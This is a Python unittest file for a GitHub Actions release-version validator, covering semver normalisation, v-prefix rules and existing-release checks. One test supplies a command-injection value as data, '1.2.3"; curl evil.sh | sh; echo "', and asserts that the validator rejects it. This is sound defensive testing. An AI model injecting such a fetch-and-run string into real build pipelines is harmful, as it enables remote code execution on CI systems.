"""Behavioural tests for the release-version validator.

Run from the repo root:  python3 -m unittest discover -s tests -v
"""

from __future__ import annotations

import contextlib
import importlib.util
import io
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

SCRIPT_PATH = (
    Path(__file__).resolve().parents[1]
    / ".github/actions/validate-release-version/release_version.py"
)
_spec = importlib.util.spec_from_file_location("release_version", SCRIPT_PATH)
release_version = importlib.util.module_from_spec(_spec)
sys.modules["release_version"] = release_version
_spec.loader.exec_module(release_version)


def run_main(env: dict[str, str], *, existing_release: bool = False) -> tuple[int, str, dict[str, str]]:
    """Run main() with `env`, returning (exit code, stdout, outputs written to GITHUB_OUTPUT)."""
    with tempfile.TemporaryDirectory() as tmp:
        output_file = Path(tmp) / "output"
        output_file.touch()
        full_env = {"GITHUB_OUTPUT": str(output_file), "GITHUB_REPOSITORY": "acme/svc", **env}
        out = io.StringIO()
        with mock.patch.dict(os.environ, full_env, clear=True), \
                mock.patch.object(release_version, "release_exists", return_value=existing_release), \
                contextlib.redirect_stdout(out):
            code = release_version.main()
        outputs = dict(
            line.split("=", 1) for line in output_file.read_text().splitlines() if "=" in line
        )
        return code, out.getvalue(), outputs


class NormalizeTest(unittest.TestCase):
    def test_bare_semver_is_accepted_and_tag_gets_a_v_prefix(self):
        self.assertEqual(release_version.normalize("1.2.3", "forbid"), ("1.2.3", "v1.2.3"))

    def test_leading_v_is_rejected_when_prefix_is_forbidden(self):
        with self.assertRaises(ValueError) as caught:
            release_version.normalize("v1.2.3", "forbid")
        self.assertIn("no leading v", str(caught.exception))

    def test_leading_v_is_stripped_when_prefix_is_allowed(self):
        self.assertEqual(release_version.normalize("v1.2.3", "allow"), ("1.2.3", "v1.2.3"))

    def test_bare_semver_is_still_accepted_when_prefix_is_allowed(self):
        self.assertEqual(release_version.normalize("4.5.6", "allow"), ("4.5.6", "v4.5.6"))

    def test_malformed_versions_are_rejected(self):
        for bad in ["", "1.2", "1.2.3.4", "1.2.3-rc1", "1.2.x", "vv1.2.3", " 1.2.3", "1.2.3\n"]:
            with self.subTest(bad=bad), self.assertRaises(ValueError):
                release_version.normalize(bad, "allow")

    def test_shell_metacharacters_are_rejected_not_executed(self):
        # The old workflows interpolated this straight into a shell script.
        with self.assertRaises(ValueError):
            release_version.normalize('1.2.3"; curl evil.sh | sh; echo "', "forbid")

    def test_unknown_prefix_mode_is_a_configuration_error(self):
        with self.assertRaises(ValueError) as caught:
            release_version.normalize("1.2.3", "sometimes")
        self.assertIn("VERSION_PREFIX", str(caught.exception))


class MainTest(unittest.TestCase):
    def test_valid_new_version_writes_version_and_tag_outputs(self):
        code, _, outputs = run_main(
            {"VERSION": "2.0.1", "VERSION_PREFIX": "forbid", "EXISTING_RELEASE": "forbid"}
        )
        self.assertEqual(code, 0)
        self.assertEqual(outputs, {"version": "2.0.1", "tag": "v2.0.1"})

    def test_existing_release_fails_when_forbidden(self):
        code, stdout, outputs = run_main(
            {"VERSION": "2.0.1", "VERSION_PREFIX": "forbid", "EXISTING_RELEASE": "forbid"},
            existing_release=True,
        )
        self.assertEqual(code, 1)
        self.assertIn("::error title=Version exists::", stdout)
        self.assertEqual(outputs, {})

    def test_existing_release_is_ignored_when_requested(self):
        code, _, outputs = run_main(
            {"VERSION": "v2.0.1", "VERSION_PREFIX": "allow", "EXISTING_RELEASE": "ignore"},
            existing_release=True,
        )
        self.assertEqual(code, 0)
        self.assertEqual(outputs, {"version": "2.0.1", "tag": "v2.0.1"})

    def test_malformed_version_fails_with_an_annotation_and_no_outputs(self):
        code, stdout, outputs = run_main(
            {"VERSION": "not-a-version", "VERSION_PREFIX": "forbid", "EXISTING_RELEASE": "forbid"}
        )
        self.assertEqual(code, 1)
        self.assertIn("::error title=Bad version::", stdout)
        self.assertEqual(outputs, {})

    def test_missing_version_variable_fails_instead_of_passing_an_empty_string(self):
        code, stdout, _ = run_main({"VERSION_PREFIX": "forbid", "EXISTING_RELEASE": "forbid"})
        self.assertEqual(code, 1)
        self.assertIn("::error", stdout)

    def test_unknown_existing_release_mode_fails_fast(self):
        code, stdout, _ = run_main(
            {"VERSION": "1.0.0", "VERSION_PREFIX": "forbid", "EXISTING_RELEASE": "maybe"}
        )
        self.assertEqual(code, 1)
        self.assertIn("EXISTING_RELEASE", stdout)


if __name__ == "__main__":
    unittest.main()
